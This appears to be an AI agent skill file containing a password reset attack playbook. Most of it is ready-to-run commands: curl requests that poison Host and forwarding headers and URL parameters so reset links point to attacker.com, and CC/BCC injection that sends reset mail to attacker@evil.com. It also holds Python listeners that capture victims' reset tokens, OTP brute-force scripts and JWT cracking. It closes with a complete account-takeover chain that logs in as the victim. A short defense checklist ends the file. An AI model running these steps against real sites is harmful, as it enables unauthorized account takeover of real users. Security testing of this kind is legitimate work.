---
name: password-reset
description: Password reset poisoning and token manipulation — tests Host header injection, reset token predictability/reuse/expiration, email parameter manipulation, and OTP brute-force during password recovery flows.
---

# Password Reset Attack Playbook

## Overview
Password reset flows are a rich attack surface because they bridge unauthenticated and authenticated states. A flaw here can yield full account takeover (ATO) without knowing the victim's password. This skill covers the full kill chain: poisoning the reset link delivery, manipulating the token, manipulating email parameters, brute-forcing OTPs/tokens, and chaining into ATO.

**Impact target:** Full account takeover of any user whose email address is known.

---

## 1. Recon — Mapping the Reset Flow

Before poisoning anything, map every entry and exit point of the reset flow.

### 1.1 Identify all reset-related endpoints
- `POST /password/reset`, `/forgot-password`, `/account/recovery`, `/auth/forgot`
- `POST /password/reset/resend`, `/password/reset/resend-link`
- `GET /password/reset/{token}`, `/reset-password?token=...`
- `POST /password/reset/{token}` (the actual password change)
- `POST /password/reset/verify`, `/verify-otp` (if OTP-based)
- Any endpoint that mentions "reset", "recover", "restore", "unlock" in Burp history or JS analysis

### 1.2 Capture the full request chain
Use Burp Proxy to capture:
1. The initial reset request (email submission)
2. The "resend link" request (if present)
3. The reset link click (GET with token)
4. The password change POST

### 1.3 Identify the reset token format
- **UUID** (e.g. `a1b2c3d4-e5f6-7890-abcd-ef1234567890`) — usually strong random
- **Hex string** (e.g. `5f4dcc3b5aa765d61d8327deb882cf99`) — check length
- **Numeric OTP** (e.g. `123456`) — brute-forceable if short
- **Timestamp-based** (e.g. `1699123456`) — predictable
- **Sequential** (e.g. `1001`, `1002`) — trivially predictable
- **Base64-encoded** blob — may contain user data or predictable structure

### 1.4 Identify email delivery mechanism
- Does the app send the email directly, or queue it for a background worker?
- Does the reset link contain the token in the URL path, query string, or POST body?
- Is the reset link an absolute URL (vulnerable to Host poisoning) or relative?

### 1.5 Identify all parameters that influence the reset link
Look for these parameters in the initial reset request — they may control the URL embedded in the email:

| Parameter | Purpose |
|---|---|
| `Host` header | Primary target for poisoning |
| `X-Forwarded-Host` | Common behind reverse proxies |
| `X-Forwarded-Server` | Alternative forwarding header |
| `X-Host` | Used by some frameworks (Symfony, Laravel) |
| `Forwarded` | RFC 7239 standard forwarding header |
| `baseurl` / `base_url` | Explicit base URL parameter |
| `return_to` / `redirect_uri` / `redirect_url` | Post-reset redirect target |
| `next` | Post-reset redirect target |
| `tenant` / `domain` | Multi-tenant domain selector |
| `origin` | Origin header |
| `callback_url` | OAuth-style callback |

---

## 2. Host Header Poisoning for Password Reset

### 2.1 Direct Host header override

**Theory:** The application builds the absolute reset URL using the `Host` header value instead of a configured `APP_URL` environment variable. By injecting an attacker-controlled host, the reset link in the email points to the attacker's server.

```bash
# Basic Host header poisoning
curl -X POST 'https://target.com/password/reset' \
  -H 'Host: attacker.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'
```

If the app sends an email with a reset link, check if the link points to `attacker.com` instead of `target.com`.

### 2.2 X-Forwarded-Host poisoning

Many applications sit behind a reverse proxy (nginx, HAProxy, Cloudflare) and read the original host from `X-Forwarded-Host`. The app may use this header to build the reset URL.

```bash
# X-Forwarded-Host poisoning
curl -X POST 'https://target.com/password/reset' \
  -H 'Host: target.com' \
  -H 'X-Forwarded-Host: attacker.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'
```

### 2.3 Forwarded header (RFC 7239)

```bash
# Forwarded header poisoning
curl -X POST 'https://target.com/password/reset' \
  -H 'Host: target.com' \
  -H 'Forwarded: host=attacker.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'
```

### 2.4 X-Host and X-Original-Host

Some frameworks (Symfony, certain nginx configs) check these headers:

```bash
# X-Host poisoning
curl -X POST 'https://target.com/password/reset' \
  -H 'Host: target.com' \
  -H 'X-Host: attacker.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'

# X-Original-Host poisoning
curl -X POST 'https://target.com/password/reset' \
  -H 'Host: target.com' \
  -H 'X-Original-Host: attacker.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'
```

### 2.5 Duplicate Host headers

Some servers process the first or last Host header inconsistently. Test both:

```bash
# First Host wins (some servers)
curl -X POST 'https://target.com/password/reset' \
  -H 'Host: attacker.com' \
  -H 'Host: target.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'

# Last Host wins (other servers)
curl -X POST 'https://target.com/password/reset' \
  -H 'Host: target.com' \
  -H 'Host: attacker.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'
```

### 2.6 Absolute URI with mismatched Host

```bash
# Absolute URI in request line, mismatched Host
curl -X POST 'https://target.com/password/reset' \
  -H 'Host: attacker.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com' \
  --path-as-is
```

### 2.7 Port and path suffix tricks

```bash
# Append port
curl -X POST 'https://target.com/password/reset' \
  -H 'Host: target.com:80@attacker.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'

# Path-confusing suffix
curl -X POST 'https://target.com/password/reset' \
  -H 'Host: target.com#@attacker.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'
```

### 2.8 Explicit URL parameters

If the reset request accepts explicit URL parameters:

```bash
# baseurl parameter
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com&baseurl=https://attacker.com'

# return_to parameter
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com&return_to=https://attacker.com/reset'

# redirect_uri parameter
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com&redirect_uri=https://attacker.com'

# next parameter
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com&next=https://attacker.com'

# tenant/domain selector (multi-tenant apps)
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com&tenant=attacker.com'
```

### 2.9 Resend endpoint testing

The "resend reset link" endpoint is often overlooked. Test the same poisoning vectors:

```bash
# Resend with Host poisoning
curl -X POST 'https://target.com/password/reset/resend' \
  -H 'Host: attacker.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'

# Resend with X-Forwarded-Host
curl -X POST 'https://target.com/password/reset/resend' \
  -H 'Host: target.com' \
  -H 'X-Forwarded-Host: attacker.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'
```

### 2.10 Burp Suite workflow

1. Intercept the password reset request in Burp Proxy
2. Send to Repeater
3. Add/modify headers: `Host`, `X-Forwarded-Host`, `X-Forwarded-Server`, `X-Host`, `Forwarded`
4. Add URL parameters: `baseurl`, `return_to`, `redirect_uri`, `next`, `tenant`
5. Send the request and check if the reset email contains a link pointing to your domain
6. Set up a listener on your domain to capture the reset token when the victim clicks the link

```bash
# Quick listener to capture reset tokens
python3 -c "
import http.server, urllib.parse
class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[+] Reset link clicked: {self.path}')
        print(f'[+] Full URL: {self.headers.get(\"Host\")}{self.path}')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Password reset link received.')
http.server.HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
"
```

---

## 3. Token Analysis — Predictability, Reuse, Expiration

### 3.1 Token predictability

Request multiple reset tokens and compare them:

```bash
# Request 5 reset tokens for the same email
for i in $(seq 1 5); do
  curl -s -X POST 'https://target.com/password/reset' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -d 'email=test@example.com'
  # Extract token from email or response
done
```

Look for patterns:
- **Sequential:** `1001`, `1002`, `1003` — trivially predictable
- **Timestamp-based:** `1699123456`, `1699123457` — derive from current time
- **Weak random:** Short numeric strings, small character set
- **UUIDv4:** Should be unpredictable — but check if they're actually UUIDv4

### 3.2 Token length analysis

```bash
# Extract token from reset link and check length
# UUID: 36 chars (32 hex + 4 hyphens)
# 32-char hex: 128 bits of entropy — strong
# 16-char hex: 64 bits — borderline
# 8-char hex: 32 bits — brute-forceable
# 6-digit numeric: 20 bits — trivially brute-forceable
```

### 3.3 Token reuse testing

Test if a reset token can be used multiple times:

```bash
# Step 1: Request a reset token (extract from email)
# Step 2: Use the token to reset the password
curl -X POST 'https://target.com/password/reset/TOKEN' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'password=NewPassword123!&password_confirmation=NewPassword123!'

# Step 3: Try to use the same token again
curl -X POST 'https://target.com/password/reset/TOKEN' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'password=AnotherPassword456!&password_confirmation=AnotherPassword456!'

# If the second request succeeds, the token is reusable — this is a vulnerability
```

### 3.4 Token expiration bypass

Test if tokens expire:

```bash
# Request a token, wait for the stated expiration period, then try to use it
# If the app says "token expires in 1 hour" but it still works after 2 hours, that's a bug

# Some apps allow token reuse after password change (password reset loop)
# Test: reset password -> immediately request another reset -> use old token
```

### 3.5 Token tied to user agent or IP

```bash
# Request reset with one User-Agent
curl -X POST 'https://target.com/password/reset' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'

# Use the token with a different User-Agent
curl -X POST 'https://target.com/password/reset/TOKEN' \
  -H 'User-Agent: curl/7.68.0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'password=NewPassword123!'

# If it works, the token is not tied to User-Agent
```

### 3.6 JWT-based reset tokens

If the reset token is a JWT, analyze it:

```bash
# Decode the JWT
jwt_tool TOKEN -d

# Check for:
# - alg: none (no signature verification)
# - alg: HS256 with weak secret
# - predictable claims (sub, email, exp)
# - no exp claim (never expires)

# Try algorithm confusion attack
jwt_tool TOKEN --crack --wordlist /usr/share/wordlists/rockyou.txt

# Try none algorithm
jwt_tool TOKEN -T none
```

---

## 4. Email Parameter Manipulation

### 4.1 CC/BCC parameter injection

Test if the reset request accepts CC/BCC email parameters:

```bash
# Test CC parameter
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com&cc=attacker@evil.com'

# Test BCC parameter
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com&bcc=attacker@evil.com'

# Test multiple email parameters
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com&email=attacker@evil.com'
```

### 4.2 Email parameter mass assignment

Test if you can change the email the reset is sent to:

```bash
# Try changing the email parameter to your own
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com&to=attacker@evil.com'

# Try with JSON body (if API accepts JSON)
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/json' \
  -d '{"email": "victim@target.com", "to": "attacker@evil.com"}'

# Try with array parameter
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com&to[]=attacker@evil.com'
```

### 4.3 Sender/reply-to manipulation

```bash
# Test from parameter
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com&from=attacker@evil.com'

# Test reply_to parameter
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com&reply_to=attacker@evil.com'
```

---

## 5. OTP / Brute Force Testing

### 5.1 Token brute-force

If the reset token is short (numeric OTP, short hex string), brute-force it:

```bash
# 6-digit numeric OTP (1 million combinations)
# Use a fast wordlist or generate on the fly
python3 -c "
for i in range(1000000):
    print(f'{i:06d}')
" > /tmp/otp-wordlist.txt

# Brute-force with ffuf
ffuf -u 'https://target.com/password/reset/verify?token=FUZZ' \
  -w /tmp/otp-wordlist.txt \
  -mc 200,302 \
  -t 50

# Brute-force with curl (for testing rate limiting)
for i in $(seq 0 999999); do
  printf -v otp "%06d" $i
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/password/reset/verify?token=$otp")
  if [ "$response" != "404" ] && [ "$response" != "400" ]; then
    echo "[+] Found valid OTP: $otp (HTTP $response)"
    break
  fi
done
```

### 5.2 Rate limiting test

Test if the reset endpoint has rate limiting:

```bash
# Send 20 rapid requests
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" \
    -X POST 'https://target.com/password/reset' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -d 'email=victim@target.com'
done | sort | uniq -c | sort -rn

# If all return 200/202 without 429, there's no rate limiting
# If you see 429 after a few requests, note the threshold
```

### 5.3 Token in URL referrer

Check if the reset token leaks via the `Referer` header:

```bash
# If the reset page loads external resources (analytics, fonts, etc.)
# the full URL including the token may be sent in the Referer header

# Test by setting up a listener and checking if the token appears
# in the Referer header when the victim visits the reset page
```

### 5.4 Token in server logs

Check if the reset token appears in:
- Error messages (stack traces that include the URL)
- Log files (if you have access via another vulnerability)
- Debug endpoints
- Cache headers

```bash
# Check response headers for token leakage
curl -v -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com' 2>&1 | grep -i token
```

---

## 6. Exploitation Chain — Full ATO

### 6.1 Host header poisoning → token capture → ATO

```bash
# Step 1: Set up attacker server to capture reset tokens
# Save as capture.py and run: python3 capture.py
python3 -c "
import http.server, urllib.parse, sys
class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        token = params.get('token', [''])[0]
        if token:
            print(f'[+] CAPTURED TOKEN: {token}', flush=True)
            with open('captured_token.txt', 'w') as f:
                f.write(token)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'<html><body>Redirecting...</body></html>')
http.server.HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
" &

# Step 2: Poison the Host header to point reset link to attacker server
curl -X POST 'https://target.com/password/reset' \
  -H 'Host: attacker.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'

# Step 3: Wait for victim to click the link in their email
# The reset link will point to attacker.com, and the token will be captured

# Step 4: Use the captured token to reset the victim's password
TOKEN=$(cat captured_token.txt)
curl -X POST "https://target.com/password/reset/${TOKEN}" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'password=AttackerPassword123!&password_confirmation=AttackerPassword123!'

# Step 5: Log in as the victim
curl -X POST 'https://target.com/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com&password=AttackerPassword123!'
```

### 6.2 Token brute-force → ATO

```bash
# Step 1: Request a reset token for the victim's email
curl -X POST 'https://target.com/password/reset' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim@target.com'

# Step 2: Brute-force the token (if short/weak)
# Use the brute-force script from section 5.1

# Step 3: Once token is found, reset the password
curl -X POST "https://target.com/password/reset/${TOKEN}" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'password=AttackerPassword123!&password_confirmation=AttackerPassword123!'
```

### 6.3 Token reuse → ATO

```bash
# Step 1: Obtain a valid reset token (via poisoning or social engineering)
# Step 2: Use the token to reset the password
curl -X POST "https://target.com/password/reset/${TOKEN}" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'password=AttackerPassword123!&password_confirmation=AttackerPassword123!'

# Step 3: If the token is reusable, use it again to reset to a different password
# (useful if the victim notices and tries to reset back)
curl -X POST "https://target.com/password/reset/${TOKEN}" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'password=AnotherPassword456!&password_confirmation=AnotherPassword456!'
```

---

## 7. Defense Verification Checklist

When testing, verify which defenses are in place:

- [ ] Host header validated against allowlist
- [ ] APP_URL / SERVER_NAME used instead of HTTP_HOST for building URLs
- [ ] Forwarding headers stripped at edge (nginx `proxy_set_header Host $host;`)
- [ ] Reset tokens are UUIDv4 or 128+ bit random
- [ ] Tokens expire after a short period (≤ 1 hour)
- [ ] Tokens are single-use (invalidated after first use)
- [ ] Rate limiting on reset request and token verification endpoints
- [ ] Reset tokens are not leaked in Referer headers
- [ ] Reset tokens are not logged in server logs
- [ ] Email parameters cannot be manipulated (no mass assignment)
- [ ] CC/BCC parameters are rejected
- [ ] Reset link uses HTTPS
- [ ] Password change requires current password (not just token)

---

## References

- **HackTricks — Password Reset Poisoning:** https://book.hacktricks.xyz/web vulnerability/abuse-callback/password-reset-poisoning
- **PortSwigger — Host header injection:** https://portswigger.net/web-security/host-header
- **PortSwigger — Password reset poisoning:** https://portswigger.net/web-security/password-reset-poisoning
- **PayloadPlayground — Host header injection:** https://payloadplayground.xyz/search?query=host+header
- **OWASP — Forgot Password:** https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html
- **JWT Tool:** https://github.com/ticarpi/jwt_tool
- **Burp Suite — Intruder for OTP brute-force:** https://portswigger.net/burp/documentation/desktop/tools/intruder
